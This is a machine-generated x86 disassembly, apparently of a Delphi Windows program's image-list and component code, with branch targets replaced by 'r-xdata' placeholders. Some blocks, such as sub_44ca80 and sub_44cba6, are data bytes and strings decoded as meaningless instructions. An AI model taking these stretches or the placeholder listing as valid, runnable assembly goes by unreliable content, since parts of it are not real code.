pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44c050
sub_44c030
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_417414
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41d168
pop esi
pop ebx
retn
sub_44c050
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4176b4
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44c06c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44c0d4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_456b0c
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44f0e8
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44c97c
mov edx ebp
call sub_44c9dc
inc eax
je r-xdata
sub_44c160
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44c180
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44c1a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44c5f0
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44c5f0
sub_44c338
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d9a0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44c38c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4032e8
mov eax [ esi + 0x9c ]
call sub_4032e8
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44bc3c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d18c
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44c3dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417bf8
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44c488
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44c4e8
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44c5f0
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44c728
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44c788
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44c7e4
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44c848
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c488
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404444
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c4e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44c5e0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44bfa0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44bf8c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44c4e8
sub_44c5f0
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c668
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404444
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417570
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417570
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
sub_44c6d0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c728
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404444
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c788
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c7e4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c848
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_417570
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403498
test eax eax
je r-xdata
sub_44c8a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404444
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41d5f0
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44c488
sub_44c8f4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44c91c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44bda8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44c4e8
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44c9b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418cf0
mov edi eax
mov eax esi
call sub_44f3d4
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44c9dc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44ca20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ca45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ca4c
retn
sub_44ca80
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x44ca 0x0
ror dl 0x1
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x1f23ffc0 ] bl
inc esp
add [ ecx ] al
add bh bh
call [ eax ]
loope r-xdata
add [ eax - 0x6fffbb35 ] cl

add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
inc esp

sub_44cafc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xcb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbb35 ] cl

sub_44cb1a
inc esp
add [ eax ] ch
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x33a3ffc0 ] bl
inc esp
add [ esi + edx * 8 - 0x25cbffbc ] ch
inc esp
add ah ch
aad 0x44
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
adc ah cl
inc esp
add al ah
rol [ eax + eax - 0x38 ] 0x1
int3
sub_44cba6
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x46de8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x19e80f74 ] 0x6a
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp [ edi + 0x41 ] bl
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_44cc10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44cc5c
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_417658
mov edx eax
mov eax edi
call sub_44d84c
mov eax [ edi + 0x50 ]
call sub_4032e8
mov eax edi
call sub_44cf20
mov eax [ edi + 0x4c ]
call sub_4032e8
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41d0e4
test bl bl
jle r-xdata
call sub_4032e8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_44ccc8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44cd75
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44d7d4
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44cd94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cd7c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_44cd94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ce35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_426878
mov eax ebx
call sub_425d58
mov eax [ eax + 0x14 ]
xor edx edx
call sub_420c38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41613c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_425d58
pop edx
call sub_421010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ce3c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ce58
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44cd94
pop ecx
pop edx
pop ebx
retn
sub_44ce90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cf20
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44ce58
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4034e4
sub_44cecc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44d75c
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_425dc4
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44cf20
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4034e4
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cebc
push eax
call ImageList_Destroy
sub_44cf58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44cfeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44cd80
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cff2
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx eax
mov eax ebx
call sub_44d180
sub_44cff8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d0a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d08a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cd88
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cecc
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cecc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d091
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
sub_44d0c4
push ebx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44cebc
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44d0e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d167
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44d0c4
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44cd80
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax ebx
mov si 0xffef
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d16e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push esi
mov eax ebx
call sub_44cebc
push eax
call ImageList_Remove
sub_44d180
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44cbd0
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4034e4
pop esi
pop ebx
retn
sub_44d1b8
push ebx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44cebc
push eax
call ImageList_GetBkColor
call sub_44cbf0
pop ebx
retn
sub_44d1e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
